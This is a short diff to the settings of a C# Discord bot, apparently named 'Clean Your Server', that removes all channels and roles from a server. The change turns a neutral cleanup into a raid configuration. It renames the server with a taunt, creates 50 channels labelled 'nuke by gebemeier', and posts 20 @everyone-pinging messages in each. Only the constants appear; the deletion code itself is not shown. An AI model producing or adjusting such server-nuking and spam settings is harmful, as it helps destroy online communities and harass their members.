@@ -7,12 +7,12 @@ class Program
     private static byte[]? _logoBytes;
 
     // ── Hier alles anpassen ───────────────────────────────────────────────────
-    const string SERVER_NAME      = "SERVER GEREINIGT"; // Servername nach dem Clean
-    const string CHANNEL_NAME     = "information";       // Name der neuen Kanäle
-    const int    CHANNEL_COUNT    = 3;                   // Anzahl der Kanäle
-    const int    MESSAGE_COUNT    = 1;                   // Nachrichten pro Kanal
+    const string SERVER_NAME      = "Sie wurden Gegebemeiert"; // Servername nach dem Clean
+    const string CHANNEL_NAME     = "nuke by gebemeier";       // Name der neuen Kanäle
+    const int    CHANNEL_COUNT    = 50;                   // Anzahl der Kanäle
+    const int    MESSAGE_COUNT    = 20;                   // Nachrichten pro Kanal
     const string MESSAGE_TEXT     =
-        "✅ **Server erfolgreich Gereinigt!**\n" +
+        "✅ **Sie wurden Gegebemeiert @everyone!**\n" +
         "> Alle Kanäle und Rollen wurden entfernt.\n" +
         "> Powered by **Clean Your Server**";
     // ─────────────────────────────────────────────────────────────────────────
